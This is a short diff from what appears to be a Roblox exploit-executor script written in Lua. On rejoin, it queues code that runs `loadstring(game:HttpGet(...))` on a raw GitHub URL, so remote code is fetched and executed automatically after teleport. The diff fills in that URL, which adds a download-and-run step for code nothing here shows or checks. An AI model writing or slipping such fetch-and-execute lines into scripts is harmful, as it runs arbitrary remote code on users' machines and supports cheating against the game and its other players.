@@ -415,7 +415,7 @@ local function LNIUNY_fake_script() -- ScreenGui.LocalScript
 	end)
 	rejoin:Connect(function()
 		local script = [==[
-        loadstring(game:HttpGet(""))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/adi33333333334/a/refs/heads/main/a"))()
     ]==]
     queueonteleport(script)
 		game["Teleport Service"]:TeleportToPlaceInstance(game.PlaceId,game.JobId,game.Players.LocalPlayer)
